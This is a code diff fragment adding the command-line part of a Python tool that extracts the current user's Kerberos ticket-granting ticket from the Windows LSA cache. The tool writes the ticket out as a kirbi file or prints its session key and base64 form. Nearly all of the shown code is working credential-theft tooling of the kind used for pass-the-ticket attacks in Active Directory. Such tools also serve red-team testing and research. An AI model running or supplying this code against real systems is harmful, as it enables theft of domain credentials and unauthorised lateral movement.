+    tkt = _KC.load(raw_ticket["Ticket"]).native
+    realm = (
+        tkt.get("realm", b"").decode() if isinstance(tkt.get("realm"), bytes)
+        else str(tkt.get("realm", ""))
+    )
+    sname = tkt.get("sname", {})
+    parts = [s.decode() if isinstance(s, bytes) else str(s) for s in sname.get("name-string", [])]
+    print(f"[+] Ticket for: {'/'.join(parts)}@{realm}")
+    print(f"[+] Session key: {raw_ticket['Key']['KeyType']} / {raw_ticket['Key']['Key'].hex()[:16]}...")
+
+
+def main():
+    import argparse
+    ap = argparse.ArgumentParser(description="Extract current user's Kerberos TGT")
+    ap.add_argument("--target", help="SPN (default: cifs\\<LOGONSERVER>)")
+    ap.add_argument("-o", "--out-file", help="Save TGT as kirbi file")
+    ap.add_argument("-v", "--verbose", action="store_true", help="Show ticket metadata")
+    args = ap.parse_args()
+
+    raw_ticket = []
+    def _cb(t):
+        raw_ticket.append(t)
+
+    kirbi = get_tgt(args.target)
+
+    # Re-fetch metadata for verbose (cheap since cached in LSA)
+    if args.verbose:
+        lsa = LsaConnectUntrusted()
+        try:
+            pkg_id = LsaLookupAuthenticationPackage(lsa, "kerberos")
+            t = extract_ticket(lsa, pkg_id, 0, args.target or os.environ.get("LOGONSERVER", "").lstrip("\\"))
+            _print_ticket_info(t)
+        finally:
+            LsaDeregisterLogonProcess(lsa)
+
+    if args.out_file:
+        with open(args.out_file, "wb") as f:
+            f.write(kirbi)
+        print(f"[+] Wrote TGT ({len(kirbi)} bytes) to {args.out_file}")
+        return
+
+    # Print details to stdout
+    from minikerberos.protocol.asn1_structs import KRB_CRED
+    k = KRB_CRED.load(kirbi).native
+    for ticket in k.get("tickets", []):
+        realm = ticket.get("realm", b"").decode() if isinstance(ticket.get("realm"), bytes) else str(
+            ticket.get("realm", ""))
+        sname = ticket.get("sname", {})
+        parts = [s.decode() if isinstance(s, bytes) else str(s) for s in sname.get("name-string", [])]
+        print(f"  SPN:    {'/'.join(parts)}")
+        print(f"  Realm:  {realm}")
+
+    if k.get("enc-part", {}).get("etype") == 0:
+        cred = EncKrbCredPart.load(k["enc-part"]["cipher"]).native
+        for info in cred.get("ticket-info", []):
+            key = info.get("key", {})
+            keytype = key.get("keytype", "?")
+            keyvalue = base64.b64encode(key.get("keyvalue", b"")).decode()
+            flags = info.get("flags", [])
+            print(f"  Client:   {'/'.join(info.get('pname', {}).get('name-string', []))}")
+            print(f"  Realm:    {info.get('prealm', '')}")
+            print(f"  Start:    {info.get('starttime', '?')}")
+            print(f"  End:      {info.get('endtime', '?')}")
+            print(f"  Renew:    {info.get('renew-till', '?')}")
+            print(f"  Flags:    {', '.join(flags) if flags else '?'}")
+            print(f"  KeyType:  {keytype}")
+            print(f"  Key:      {keyvalue}")
+    print(f"  KirbiB64: {base64.b64encode(kirbi).decode()}")
 
 
 if __name__ == "__main__":
